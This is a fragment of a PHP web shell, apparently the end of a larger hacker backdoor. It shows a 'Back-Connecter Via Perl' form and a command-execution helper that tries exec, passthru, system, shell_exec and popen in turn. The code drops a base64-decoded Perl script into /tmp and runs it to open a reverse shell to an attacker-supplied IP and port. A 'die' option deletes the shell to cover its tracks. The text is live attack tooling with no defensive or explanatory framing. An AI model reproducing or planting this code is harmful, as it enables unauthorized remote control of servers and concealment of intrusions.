				echo "<center><br><br><form name='nfp' onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\" method='POST'><span style='font-family: cursive; font-size: 200%; color: white;'>Back-Connecter Via Perl</span><br/><br>Your Ip: <input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'><br><br> Port to bind: <input type='text' name='port' value='110'><br><br><input type=submit name='backconnect' value='Submit'></form><br>";			
				if(isset($_POST['backconnect'])) {
					function cf($f,$t) {
						$w = @fopen($f,"w") or @function_exists('file_put_contents');
						if($w){
							@fwrite($w,@base64_decode($t));
							@fclose($w);
					}
				}
				function An0n3xPloiTeR($in) {
					$out = '';
					if (function_exists('exec')) {
						@exec($in,$out);
						$out = @join("\n",$out);
					} elseif (function_exists('passthru')) {
						ob_start();
						@passthru($in);
						$out = ob_get_clean();
					} elseif (function_exists('system')) {
						ob_start();
						@system($in);
						$out = ob_get_clean();
					} elseif (function_exists('shell_exec')) {
						$out = shell_exec($in);
					} elseif (is_resource($f = @popen($in,"r"))) {
						$out = "";
						while(!@feof($f))
							$out .= fread($f,1024);
						pclose($f);
					}
					return $out;
				}

				if($_POST['backconnect']) {
					cf("/tmp/bc.pl",$back_connect_p);
					$out = An0n3xPloiTeR("perl /tmp/bc.pl ".$_POST['server']." ".$_POST['port']." 1>/dev/null 2>&1 &");
            		sleep(1);
					echo "<pre class=ml1>$out\n".An0n3xPloiTeR("ps aux | grep bc.pl")."</pre>";
            		unlink("/tmp/bc.pl");
					}
				}
			}	
		?>
		<?php
			if (isset($_GET['die'])) {
				?>
					<form action="" method="POST"><center><br><br>
						<font style="color: red; font-family: cursive; font-size: 200%;">You Sure ?</font><br><br><input type="submit" name="fuckoff" value="Yes" />
					</form>
				<?php

				if (isset($_POST['fuckoff'])) {
					if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__))) {
						die('<font style="color: red; font-family: cursive; font-size: 200%;"><br><br>You <span style="color: teal;">Deleted</span> Me :3 <br> Now <span style="color: lawngreen;">Fuck </span>Off :V<br>');}
				}
			}
		?>	
		</div>
	</body>
</html>